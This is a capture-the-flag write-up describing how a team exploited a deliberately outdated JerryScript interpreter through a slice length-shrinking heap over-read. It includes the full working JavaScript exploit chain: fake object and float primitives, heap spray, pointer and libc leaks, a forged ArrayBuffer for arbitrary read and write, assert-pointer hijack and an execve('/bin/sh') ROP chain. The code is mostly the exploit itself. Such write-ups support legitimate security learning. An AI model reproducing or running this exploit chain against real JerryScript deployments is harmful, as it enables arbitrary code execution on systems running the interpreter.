## Overall
The challenge is about exploiting a tiny open-soruce javascript interpreter [Jerry](https://github.com/jerryscript-project/jerryscript). The author intentionally reverted several critical bugs by setting the HEAD to an old version, specifically commit ID `d4178ae3`. The solve of this challenge was a collaboration with two brilliant teammates, [n0psledbyte](https://twitter.com/n0psledbyte) and [hk](https://twitter.com/harsh_khuha).

## Finding out the version
At first, we didn't know how to start. It seemed like a closed source binary and we didn't know it had a disclosed source. So I first pointed out that it could be open soruce, and found out that it was indeed, open source. Then [n0psledbyte](https://twitter.com/n0psledbyte) pointed out that it has a commit id within the binary by printing the version. So I reverted the commit and checked that it was made at about July, 2021.

```
commit d4178ae3861fe32c8b350470facd41c8e04171d0 (HEAD)
Author: Zoltan Herczeg <zherczeg.u-szeged@partner.samsung.com>
Date:   Sat Jul 24 09:26:46 2021 +0200

    Support dynamic import calls (#4652)
    
    JerryScript-DCO-1.0-Signed-off-by: Zoltan Herczeg zherczeg.u-szeged@partner.samsung.com
```

Now, I looked at closed issues that were made after July. I used the keyword 'Overflow' to search for memory corruption bugs. Then I found a really [interesting one](https://github.com/jerryscript-project/jerryscript/issues/4777). This bug was exactly the same with a very famous JSC bug known as CVE-2016-4622, described in detail [here](http://phrack.org/issues/70/3.html). So I instantly wrote a working exploit that crashed the interpreter.

```javascript
var a = [];
for (var i = 0; i < 100; i++)
    a.push(i + 0.123);

var b = a.slice(0, {valueOf: function() { a.length = 3; return 10; }});
console.log(b);
```

So basically, what's happening here is that the length of an array is being reduced within the slice method. Therefore, a heap-over-read occurs. This is a source code from `jerry-core/ecma/builtin-objects/ecma-builtin-array-prototype.c`.

```c
static ecma_value_t
ecma_builtin_array_prototype_object_slice (ecma_value_t arg1, /**< start */
                                           ecma_value_t arg2, /**< end */
                                           ecma_object_t *obj_p, /**< object */
                                           ecma_length_t len) /**< object's length */
{
  ecma_length_t start = 0, end = len;

  /* [1] */
  if (ECMA_IS_VALUE_ERROR (ecma_builtin_helper_array_index_normalize (arg1,
                                                                      len,
                                                                      &start)))
  {
    return ECMA_VALUE_ERROR;
  }

  /* [2] */
  if (ecma_is_value_undefined (arg2))
  {
    end = len;
  }
  else
  {
    /* 7. part 2, 8.*/
    if (ECMA_IS_VALUE_ERROR (ecma_builtin_helper_array_index_normalize (arg2,
                                                                        len,
                                                                        &end)))
    {
      return ECMA_VALUE_ERROR;
    }
  }

  JERRY_ASSERT (start <= len && end <= len);

  ... (reduced)

  /* [3] */
  ecma_value_t *from_buffer_p = ECMA_GET_NON_NULL_POINTER (ecma_value_t, obj_p->u1.property_list_cp);
      
      /* [4] */
      for (uint32_t k = (uint32_t) start; k < (uint32_t) end; k++, n++)
      {
#if JERRY_ESNEXT
        ecma_free_value_if_not_object (to_buffer_p[n]);
#endif /* JERRY_ESNEXT */
        to_buffer_p[n] = ecma_copy_value_if_not_object (from_buffer_p[k]);
        ecma_value_t value = from_buffer_p[k];
      }

      ext_to_obj_p->u.array.length_prop_and_hole_count &= ECMA_FAST_ARRAY_HOLE_ONE - 1;
      return ecma_make_object_value (new_array_p);
    }
  }
```

I only put relevant parts in the code. The [1] and the [2] of this function is to calculate `end` and `start`, which are respectively `arg1` and `arg0`. Then, in [3] the backing pointer (`from_buffer_p`) is extracted from the array object(`obj_p`) and in [4] the actual copying is done. If `arg1` and `arg0` are JS numbers, this code wouldn't be a problem. However, if one of them are objects, then it can cause a side effect and `end` can be bigger than array length, causing a heap-over-read. Now, how can we exploit this?

## Exploit plan 1: fakeFloat and fakeObject
In JerryScript arrays, all values are represented in a compressed form. All values are 32bit, and the lower 3 bits represent the type of the value and the high 29bits represent the value itself. You might have a question here. How are we supposed to represent all sorts of complex structures using only 29 bits? Well, this is solved using a mechanism called compressed_pointers. 

The JerryScript heap is actually a global array in the `.bss` region. All 'pointers' are actually in the form of `array_base` + `offset`, and only the `offset` is included in the pointer. This is implemented in the following code at `jerry-core/jmem/jmem-allocator.c`.

```c
extern inline void * JERRY_ATTR_PURE JERRY_ATTR_ALWAYS_INLINE
jmem_decompress_pointer (uintptr_t compressed_pointer) /**< pointer to decompress */
{
  JERRY_ASSERT (compressed_pointer != JMEM_CP_NULL);

  uintptr_t uint_ptr = compressed_pointer;

  JERRY_ASSERT (((jmem_cpointer_t) uint_ptr) == uint_ptr);

#if defined (ECMA_VALUE_CAN_STORE_UINTPTR_VALUE_DIRECTLY) && JERRY_CPOINTER_32_BIT
  JERRY_ASSERT (uint_ptr % JMEM_ALIGNMENT == 0);
#else /* !ECMA_VALUE_CAN_STORE_UINTPTR_VALUE_DIRECTLY || !JERRY_CPOINTER_32_BIT */
  const uintptr_t heap_start = (uintptr_t) &JERRY_HEAP_CONTEXT (first);

  uint_ptr <<= JMEM_ALIGNMENT_LOG;
  uint_ptr += heap_start;

  JERRY_ASSERT (jmem_is_heap_pointer ((void *) uint_ptr));
#endif /* ECMA_VALUE_CAN_STORE_UINTPTR_VALUE_DIRECTLY && JERRY_CPOINTER_32_BIT */

  return (void *) uint_ptr;
} /* jmem_decompress_pointer */
```

As you can infer, `JMEM_ALIGNMENT_LOG` is 3.

And the types are listed here.
```c
typedef enum
{
  ECMA_TYPE_DIRECT = 0, /**< directly encoded value, a 28 bit signed integer or a simple value */
  ECMA_TYPE_STRING = 1, /**< pointer to description of a string */
  ECMA_TYPE_FLOAT = 2, /**< pointer to a 64 or 32 bit floating point number */
  ECMA_TYPE_OBJECT = 3, /**< pointer to description of an object */
  ECMA_TYPE_SYMBOL = 4, /**< pointer to description of a symbol */
  ECMA_TYPE_DIRECT_STRING = 5, /**< directly encoded string values */
  ECMA_TYPE_BIGINT = 6, /**< pointer to a bigint primitive */
  ECMA_TYPE_ERROR = 7, /**< pointer to description of an error reference (only supported by C API) */
  ECMA_TYPE_SNAPSHOT_OFFSET = ECMA_TYPE_ERROR, /**< offset to a snapshot number/string */
  ECMA_TYPE___MAX = ECMA_TYPE_ERROR /** highest value for ecma types */
} ecma_type_t;
```

Now, we can forge a `fakeObj` primitive.
```javascript
function fakeObj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 3;
            return 13;
        }
    });
    return b.pop();
}
```
If you see this, we first create a fasttype array (contiguous array) named `a`. Then, what happens is the following.

[1] a.slice is called.  
[2] `start` is calculated. => `end` = 12  
[3] `end` is forcefully converted to a number by calling the valueOf function. First `a` is shrinked to length 5, and an `ArrayBuffer` is allocated right next to the buffer of `a`. (The numbers here are based on an analysis of the jmem heap allocator to reclaim space right next to `a`) Then, we write a value `(addr << 3) | 3` at the `ArrayBuffer`. Then it returns 13. => `end` = 13  
[4] Actual slicing is executed, but it reads out of bounds, returning our forged value which is `(addr << 3) | 3`. `addr<<3` is the compressed pointer, and `3` is our object type.  

Similarly we can create a fakeFloat primitive. In JerryScript floats are like pointers, which reveal the IEEE 64bit FP representation when dereferenced. So they can be used for arbitrary read on the heap. 

```javascript
function fakeFloat64(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 2;
            return 13;
        }
    });
    return b.pop()
}
```

## Heap spray
The heap space of JerryScript is really small, only 512*1024 bytes. Therefore a heap spray attack can be reliable. Also, I used the haystack-needle strategy so that when a needle is found, it can be used as a deterministic fakeObj primitive. The code for this is here. 

```javascript
var needle = new Uint8Array(8);
var needle_f = new Float64Array(needle.buffer);

var haystack = new Uint8Array(0x40000);

for (var i = 0; i < haystack.length; i+= 8) {
    needle_f[0] = i;
    haystack.set(needle, i);
}

let a = fakeFloat64(0x5000);
let find_index = Math.floor(a);
if (find_index >= 0x40000) {
    print("[-] Exploit failed: heapspray needle not found");
    throw "fail";
}
```

So we guess that at address 0x5000, there is a needle. All needles are floats that represent the offset from the array. (`haystack`, which is huge) 

The reason we used the strategy above is because we don't have an `addrOf` prmitive. But since we have an address whose data we can control completely, (by writing and reading to the `haystack` array) we don't need `addrOf`. 

## Leaking a pointer 
There are global objects within the JerryScript heap that contains function pointers. We leak a function pointer and calculate the binary base.

```javascript
let leak = fakeFloat64(42);
// for some reason, printing this causes exploit to fail
let pie_base = parseInt(f64_to_hex(leak), 16) - 0x00A9AA;
```

## Arbitrary read and write
Arbitrary read and write can be done by forging a fake `ArrayBuffer` object, since it contains a raw pointer instead of a compressed one. If it only contained a compressed pointer it would've been hard to exploit since we can only access the JerryScript heap. (This is not true actually since we can write at a relative address overflowing from the JerryScript heap, but only using this is difficult) At first I misunderstood the mechanism of `ArrayBuffer` and thought that it only contained an inlined buffer, but realized there are 2 modes: one mode uses an inline buffer and the other uses a raw pointer. This is evident in `jerry-core/ecma/builtin-objects/ecma-builtin-arraybuffer.c`

```c
ecma_object_t *
ecma_arraybuffer_new_object_external (uint32_t length, /**< length of the buffer_p to use */
                                      void *buffer_p, /**< pointer for ArrayBuffer's buffer backing */
                                      jerry_value_free_callback_t free_cb) /**< buffer free callback */
{
  ecma_object_t *prototype_obj_p = ecma_builtin_get (ECMA_BUILTIN_ID_ARRAYBUFFER_PROTOTYPE);
  ecma_object_t *object_p = ecma_create_object (prototype_obj_p,
                                                sizeof (ecma_arraybuffer_external_info),
                                                ECMA_OBJECT_TYPE_CLASS);

  ecma_arraybuffer_external_info *array_object_p = (ecma_arraybuffer_external_info *) object_p;
  array_object_p->extended_object.u.cls.type = ECMA_OBJECT_CLASS_ARRAY_BUFFER;
  array_object_p->extended_object.u.cls.u1.array_buffer_flags = ECMA_ARRAYBUFFER_EXTERNAL_MEMORY;
  array_object_p->extended_object.u.cls.u3.length = length;

  array_object_p->buffer_p = buffer_p;
  array_object_p->free_cb = free_cb;

  return object_p;
} /* ecma_arraybuffer_new_object_external */

/**
 * ArrayBuffer object creation operation.
 *
 * See also: ES2015 24.1.1.1
 *
 * @return ecma value
 *         Returned value must be freed with ecma_free_value
 */
ecma_value_t
ecma_op_create_arraybuffer_object (const ecma_value_t *arguments_list_p, /**< list of arguments that
                                                                          *   are passed to String constructor */
                                   uint32_t arguments_list_len) /**< length of the arguments' list */
{
  JERRY_ASSERT (arguments_list_len == 0 || arguments_list_p != NULL);

  ecma_object_t *proto_p = ecma_op_get_prototype_from_constructor (JERRY_CONTEXT (current_new_target_p),
                                                                   ECMA_BUILTIN_ID_ARRAYBUFFER_PROTOTYPE);

  if (proto_p == NULL)
  {
    return ECMA_VALUE_ERROR;
  }

  ecma_number_t length_num = 0;

  if (arguments_list_len > 0)
  {

    if (ecma_is_value_number (arguments_list_p[0]))
    {
      length_num = ecma_get_number_from_value (arguments_list_p[0]);
    }
    else
    {
      ecma_value_t to_number_value = ecma_op_to_number (arguments_list_p[0], &length_num);

      if (ECMA_IS_VALUE_ERROR (to_number_value))
      {
        ecma_deref_object (proto_p);
        return to_number_value;
      }
    }

    if (ecma_number_is_nan (length_num))
    {
      length_num = 0;
    }

    const uint32_t maximum_size_in_byte = UINT32_MAX - sizeof (ecma_extended_object_t) - JMEM_ALIGNMENT + 1;

    if (length_num <= -1.0 || length_num > (ecma_number_t) maximum_size_in_byte + 0.5)
    {
      ecma_deref_object (proto_p);
      return ecma_raise_range_error (ECMA_ERR_MSG ("Invalid ArrayBuffer length"));
    }
  }

  uint32_t length_uint32 = ecma_number_to_uint32 (length_num);

  ecma_object_t *array_buffer = ecma_arraybuffer_new_object (length_uint32);
  ECMA_SET_NON_NULL_POINTER (array_buffer->u2.prototype_cp, proto_p);
  ecma_deref_object (proto_p);

  return ecma_make_object_value (array_buffer);
} /* ecma_op_create_arraybuffer_object *
```

As you can see there are two modes of operation. So I use it to create an arbitrary read/write primitive very easily.
```javascript
//recipe for arraybuffer class
haystack[idx++] = 0x1;
haystack[idx++] = 0x0;  

haystack[idx++] = 0x11;
haystack[idx++] = 0x22;

haystack[idx++] = 0x33;
haystack[idx++] = 0x44;

haystack[idx++] = 0x55;
haystack[idx++] = 0x66;

// specific parts for arraybyffer

// 1. type of class
haystack[idx++] = 0x18;

// 2. ArrayBuffer flags. (2 is detached, 1 is external memory)
haystack[idx++] = 0x1;
haystack[idx++] = 0x00;

// 3. meainingless
haystack[idx++] = 0x00;

// 4. length
haystack[idx++] = 0xf0;
haystack[idx++] = 0xff;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

// external buffer
let old_idx = idx;
haystack[idx++] = shift(addr, 0) & 0xFF;
haystack[idx++] = shift(addr, 8) & 0xFF;
haystack[idx++] = shift(addr, 16) & 0xFF;
haystack[idx++] = shift(addr, 24) & 0xFF;
haystack[idx++] = shift(addr, 32) & 0xFF;
haystack[idx++] = shift(addr, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

var fo = fakeObj(0x5000);
var arw = new Float64Array(fo);
```

So, by accessing the array `arw` we can read and write to `addr`. Now we are nearly done. 

## Finalizing
A function pointer we can hijack is global functions, such as globals like `assert`. So I wrote code that finds the `assert` function from the JerryScript heap.

```javascript
// Find function pointer of assert
let assert_ptr = pie_base + 0xa9aa;
let heap_base = pie_base + 0x6D188;
var address = heap_base;
var found = false;

for (var i = 0; i < 0x8000; i++) {
    address = heap_base + i;
    idx = old_idx;
    haystack[idx++] = shift(address, 0) & 0xFF;
    haystack[idx++] = shift(address, 8) & 0xFF;
    haystack[idx++] = shift(address, 16) & 0xFF;
    haystack[idx++] = shift(address, 24) & 0xFF;
    haystack[idx++] = shift(address, 32) & 0xFF;
    haystack[idx++] = shift(address, 40) & 0xFF;
    haystack[idx++] = 0x00;
    haystack[idx++] = 0x00;
    let rv = parseInt(f64_to_hex(arw[0]), 16);
    if (rv == assert_ptr) {
        found = true;
        print("[+] found assert pointer at: " + address.toString(16));
        break;
    }
}
```

But we can't control the arguments, so we use a stack pivot method. So first, we leak `environ` to get a stack address, and spray `environ`-0x100 with `ret` gadgets, which is a similar techinque to NOP sled. Afterwards, I placed an `execve` rop chain that spawns a shell. I didn't use `system` because for some reason it segfaults if the stack configuration is messed up. The final exploit code is here. During the CTF I couldn't continue after creating an arbitrary read/write primitive, so n0psledbyte and hk finished the exploit.

```javascript
function fakeFloat64(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 2;
            return 13;
        }
    });
    return b.pop()
}

function fakeObj(addr) {
    var a = [];
    for (var i = 0; i < 100; i++) {
        a.push(0);
    }
    
    var b = a.slice(12, {valueOf: function() {
            a.length = 5;
            r = new ArrayBuffer(320);
            var w = new Uint32Array(r);
            w[0] = (addr << 3 ) | 3;
            return 13;
        }
    });
    return b.pop();
}

function f64_to_hex(f64v) {
    var x = new Float64Array(1);
    var y = new Uint8Array(x.buffer);
    x[0] = f64v;
    var hex_res = "0x";
    for (var i = 7; i > -1; i--) {
        hex_res += y[i].toString(16).padStart(2, "0");
    }
    return hex_res;
}

function f64_to_bigint(f64v) {
    return BigInt(f64_to_hex(f64v))
}

function f64_to_u32(f64v) {
    var x = new Float64Array(1);
    var y = new Uint32Array(x.buffer);
    x[0] = f64v;
    return y[0]
}

function num_to_f64(numv) {
    let f64 = new Float64Array(1);
    let u8 = new Uint8Array(f64.buffer);
    u8[0] = shift(numv, 0) & 0xFF;
    u8[1] = shift(numv, 8) & 0xFF;
    u8[2] = shift(numv, 16) & 0xFF;
    u8[3] = shift(numv, 24) & 0xFF;
    u8[4] = shift(numv, 32) & 0xFF;
    u8[5] = shift(numv, 40) & 0xFF;
    u8[6] = shift(numv, 48) & 0xFF;
    u8[7] = shift(numv, 56) & 0xFF;
    return f64[0];
}

function string_to_ascii_array(strv) {
    var rv = [];
    for (var i = 0; i < strv.length; i++) {
        rv.push(strv[i].charCodeAt(0));
    }
    return rv;
}

function shift(number, shift) {
    return number / Math.pow(2, shift);
}

var needle = new Uint8Array(8);
var needle_f = new Float64Array(needle.buffer);

var haystack = new Uint8Array(0x40000);

for (var i = 0; i < haystack.length; i+= 8) {
    needle_f[0] = i;
    haystack.set(needle, i);
}

let a = fakeFloat64(0x5000);
let find_index = Math.floor(a);
if (find_index >= 0x40000) {
    print("[-] Exploit failed: heapspray needle not found");
    throw "fail";
}

let leak = fakeFloat64(42);
// for some reason, printing this causes exploit to fail
let pie_base = parseInt(f64_to_hex(leak), 16) - 0x00A9AA;
let got_free = parseInt(f64_to_hex(leak), 16) - 0x00A9AA + 0x6BDE0;

// now let's leak libc
var idx = find_index;
//recipe for arraybuffer class
haystack[idx++] = 0x1;
haystack[idx++] = 0x0;  

haystack[idx++] = 0x11;
haystack[idx++] = 0x22;

haystack[idx++] = 0x33;
haystack[idx++] = 0x44;

haystack[idx++] = 0x55;
haystack[idx++] = 0x66;

// specific parts for arraybyffer

// 1. type of class
haystack[idx++] = 0x18;

// 2. ArrayBuffer flags. (2 is detached, 1 is external memory)
haystack[idx++] = 0x1;
haystack[idx++] = 0x00;

// 3. meainingless
haystack[idx++] = 0x00;

// 4. length
haystack[idx++] = 0xf0;
haystack[idx++] = 0xff;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

// external buffer
let old_idx = idx;
haystack[idx++] = shift(got_free, 0) & 0xFF;
haystack[idx++] = shift(got_free, 8) & 0xFF;
haystack[idx++] = shift(got_free, 16) & 0xFF;
haystack[idx++] = shift(got_free, 24) & 0xFF;
haystack[idx++] = shift(got_free, 32) & 0xFF;
haystack[idx++] = shift(got_free, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

print("[*] PIE: " + pie_base.toString(16));
var fo = fakeObj(0x5000);
var arw = new Float64Array(fo);
let libc_free = parseInt(f64_to_hex(arw[0]), 16);
// values here are libc dependent


// remote version
let libc_base = libc_free - 0x97740;
let libc_execve = libc_base + 0xdddb0;
let environ_ptr = libc_base + 0x1e45a0;
// 0x000000000005e735 : add rsp, 0x450 ; pop rbp ; ret
let stack_pivot_gadget = libc_base + 0x5e735;
/*
// local version
let libc_base = libc_free - 0x9d850;
let libc_execve = libc_base + 0xe62f0;
let environ_ptr = libc_base + 0x1ef2e0;
// 0x000000000005e735 : add rsp, 0x450 ; pop rbp ; ret
let stack_pivot_gadget = libc_base + 0x5e735;
*/
print("[*] LIBC: " + libc_base.toString(16));

// Find function pointer of assert
let assert_ptr = pie_base + 0xa9aa;
let heap_base = pie_base + 0x6D188;
var address = heap_base;
var found = false;


for (var i = 0; i < 0x8000; i++) {
    address = heap_base + i;
    idx = old_idx;
    haystack[idx++] = shift(address, 0) & 0xFF;
    haystack[idx++] = shift(address, 8) & 0xFF;
    haystack[idx++] = shift(address, 16) & 0xFF;
    haystack[idx++] = shift(address, 24) & 0xFF;
    haystack[idx++] = shift(address, 32) & 0xFF;
    haystack[idx++] = shift(address, 40) & 0xFF;
    haystack[idx++] = 0x00;
    haystack[idx++] = 0x00;
    let rv = parseInt(f64_to_hex(arw[0]), 16);
    if (rv == assert_ptr) {
        found = true;
        print("[+] found assert pointer at: " + address.toString(16));
        break;
    }
}

if (!found) {
    print("[-] Exploit failed: could not find createRealm pointer");
    throw "fail";
}

// now overwrite assert pointer
idx = old_idx;
haystack[idx++] = shift(address, 0) & 0xFF;
haystack[idx++] = shift(address, 8) & 0xFF;
haystack[idx++] = shift(address, 16) & 0xFF;
haystack[idx++] = shift(address, 24) & 0xFF;
haystack[idx++] = shift(address, 32) & 0xFF;
haystack[idx++] = shift(address, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;
arw[0] = num_to_f64(stack_pivot_gadget);

// leak stack from environ
idx = old_idx;
haystack[idx++] = shift(environ_ptr, 0) & 0xFF;
haystack[idx++] = shift(environ_ptr, 8) & 0xFF;
haystack[idx++] = shift(environ_ptr, 16) & 0xFF;
haystack[idx++] = shift(environ_ptr, 24) & 0xFF;
haystack[idx++] = shift(environ_ptr, 32) & 0xFF;
haystack[idx++] = shift(environ_ptr, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;
let environ = parseInt(f64_to_hex(arw[0]), 16);
let stack_addr = environ - 0x100;
print("[*] stack_addr: " + stack_addr.toString(16));

// place a rop chain on stack_addr
idx = old_idx;
haystack[idx++] = shift(stack_addr, 0) & 0xFF;
haystack[idx++] = shift(stack_addr, 8) & 0xFF;
haystack[idx++] = shift(stack_addr, 16) & 0xFF;
haystack[idx++] = shift(stack_addr, 24) & 0xFF;
haystack[idx++] = shift(stack_addr, 32) & 0xFF;
haystack[idx++] = shift(stack_addr, 40) & 0xFF;
haystack[idx++] = 0x00;
haystack[idx++] = 0x00;

let stack_pivot_code = pie_base + 0x701a;
for (var i = 0; i < 0x100; i++) {
    arw[i] = num_to_f64(stack_pivot_code)
}
var idx = 0x100;
let pop_rdi_ret = pie_base + 0x9447;
let pop_rsi_ret = pie_base + 0xbd46;
let pop_rdx_ret = pie_base + 0x9974;
let cmd_offset = 0x120*8;
let cmd_addr = stack_addr +cmd_offset; 
arw[idx++] = num_to_f64(pop_rdi_ret);
arw[idx++] = num_to_f64(cmd_addr);
arw[idx++] = num_to_f64(pop_rsi_ret);
arw[idx++] = num_to_f64(0);
arw[idx++] = num_to_f64(pop_rdx_ret);
arw[idx++] = num_to_f64(0);
arw[idx++] = num_to_f64(libc_execve);

// place /bin/sh
arw_u8 = new Uint8Array(arw.buffer);
let ascii_array = string_to_ascii_array("/bin/sh\x00");
arw_u8.set(ascii_array, cmd_offset);

// trigger assert to pivot stack into rop chain
assert("Hello world");
```

The flag is `n1ctf{Y0u_Kn0w_J3rry_1s_cle8er_th4n_T0m_b5t_y0u_d0nt_kn0w_jerry_scri9t_148257}`. Again, thanks to my wonderful teammates for solving this.